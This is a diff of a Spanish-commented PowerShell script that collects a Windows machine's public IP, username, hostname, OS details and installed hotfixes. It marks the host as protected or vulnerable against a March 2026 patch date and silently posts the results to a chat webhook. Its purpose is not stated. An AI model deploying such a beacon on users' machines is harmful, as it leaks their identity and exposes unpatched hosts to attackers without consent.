@@ -18,11 +18,10 @@ try {
     }
 } catch { }
 
-# 4. Recolección de datos con tolerancia a fallos
+# 4. Recolección de datos (Identidad del Sistema)
 $IP = try { (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5).ip } catch { "null" }
 $User = try { $env:USERNAME } catch { "null" }
 $Device = try { $env:COMPUTERNAME } catch { "null" }
-
 $SystemInfo = try {
     $OS = Get-CimInstance Win32_OperatingSystem
     $Ver = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion'
@@ -37,62 +36,62 @@ $SortedList = try {
     $WithDate + $NoDate
 } catch { @() }
 
-# Estado de seguridad (Marzo 2026)
-$StatusText = try {
-    $Limit = Get-Date -Year 2026 -Month 3 -Day 10
-    if ($SortedList | Where-Object { $_.InstalledOn -ge $Limit }) { "🛡️ PROTEGIDO" } else { "⚠️ VULNERABLE" }
-} catch { "Estado Desconocido" }
-
+$Total = $SortedList.Count
+$LimitDate = Get-Date -Year 2026 -Month 3 -Day 10
+$StatusText = if ($SortedList | Where-Object { $_.InstalledOn -ge $LimitDate }) { "🛡️ PROTEGIDO" } else { "⚠️ VULNERABLE" }
 $EmbedColor = if ($StatusText -eq "🛡️ PROTEGIDO") { 3066993 } else { 15158332 }
 
-# 5. Envío segmentado (Chunks de 3 en 3)
+# --- MENSAJE 1: IDENTIDAD (DATOS PRINCIPALES) ---
+$MainPayload = @{
+    username = "$User @ $Device"
+    avatar_url = "https://i.imgur.com/8nLFCuR.png"
+    embeds = @(@{
+        title = "🚀 Reporte de Identidad"
+        color = $EmbedColor
+        fields = @(
+            @{ name = '💻 Sistema'; value = $SystemInfo; inline = $false },
+            @{ name = '📊 Estado'; value = $StatusText; inline = $true },
+            @{ name = '👤 Usuario / IP'; value = "$User ($IP)"; inline = $true }
+        )
+        footer = @{ text = "Total de parches detectados: $Total" }
+    })
+} | ConvertTo-Json -Depth 10
+
+try {
+    $MainBytes = [System.Text.Encoding]::UTF8.GetBytes($MainPayload)
+    Invoke-RestMethod -Uri $Webhook -Method Post -Body $MainBytes -ContentType 'application/json; charset=utf-8'
+    Start-Sleep -Milliseconds 1500 # Pausa entre identidad y parches
+} catch { }
+
+
+# --- MENSAJES SIGUIENTES: PARCHES (CHUNKS DE 3) ---
 $ChunkSize = 3
-$Total = $SortedList.Count
-$Sections = [Math]::Max(1, [Math]::Ceiling($Total / $ChunkSize))
+$Sections = [Math]::Ceiling($Total / $ChunkSize)
 
-for ($i = 0; $i -lt [Math]::Max(1, $Total); $i += $ChunkSize) {
+for ($i = 0; $i -lt $Total; $i += $ChunkSize) {
     $CurrentSection = [Math]::Floor($i / $ChunkSize) + 1
+    $End = [Math]::Min($i + $ChunkSize - 1, $Total - 1)
+    $Chunk = $SortedList[$i..$End]
     
-    # Extraer trozo de parches
-    $PatchText = "No se encontraron parches."
-    if ($Total -gt 0) {
-        $End = [Math]::Min($i + $ChunkSize - 1, $Total - 1)
-        $Chunk = $SortedList[$i..$End]
-        $PatchText = ($Chunk | ForEach-Object {
-            $DateStr = if ($_.InstalledOn) { $_.InstalledOn.ToString('dd/MM/yyyy') } else { 'Sin fecha' }
-            "- **$($_.HotFixID)**`n  └ Instalado: $DateStr"
-        }) -join "`n`n"
-    }
+    $PatchText = ($Chunk | ForEach-Object {
+        $DateStr = if ($_.InstalledOn) { $_.InstalledOn.ToString('dd/MM/yyyy') } else { 'Sin fecha' }
+        "- **$($_.HotFixID)**`n  └ Instalado: $DateStr"
+    }) -join "`n`n"
 
-    # Usar ArrayList y silenciar salida con $null =
-    $Fields = New-Object System.Collections.ArrayList
-    
-    # El mensaje principal lleva la info del sistema
-    if ($CurrentSection -eq 1) {
-        $null = $Fields.Add(@{ name = '💻 Sistema'; value = $SystemInfo; inline = $false })
-        $null = $Fields.Add(@{ name = '📊 Estado'; value = $StatusText; inline = $true })
-        $null = $Fields.Add(@{ name = '👤 Usuario / IP'; value = "$User ($IP)"; inline = $true })
-    }
-
-    $null = $Fields.Add(@{ name = "📦 Parches (Sección $CurrentSection)"; value = $PatchText; inline = $false })
-
-    $Payload = @{
+    $PatchPayload = @{
         username = "$User @ $Device"
         avatar_url = "https://i.imgur.com/8nLFCuR.png"
         embeds = @(@{
-            title = if ($CurrentSection -eq 1) { '🚀 Reporte Inicial' } else { '📑 Continuación' }
+            title = "📦 Listado de Parches - Sección $CurrentSection"
             color = $EmbedColor
-            fields = $Fields
-            footer = @{ text = "Sección $CurrentSection de $Sections | Total detectado: $Total" }
+            description = $PatchText
+            footer = @{ text = "Página $CurrentSection de $Sections | Parches del $($i+1) al $($End+1)" }
         })
     } | ConvertTo-Json -Depth 10
 
     try {
-        $BodyBytes = [System.Text.Encoding]::UTF8.GetBytes($Payload)
-        Invoke-RestMethod -Uri $Webhook -Method Post -Body $BodyBytes -ContentType 'application/json; charset=utf-8'
-        if ($Sections -gt 1) { Start-Sleep -Milliseconds 1500 }
+        $PatchBytes = [System.Text.Encoding]::UTF8.GetBytes($PatchPayload)
+        Invoke-RestMethod -Uri $Webhook -Method Post -Body $PatchBytes -ContentType 'application/json; charset=utf-8'
+        Start-Sleep -Milliseconds 1500 # Evitar rate-limit
     } catch { }
-    
-    # Si no hay parches, salimos después del primer mensaje
-    if ($Total -eq 0) { break }
 }
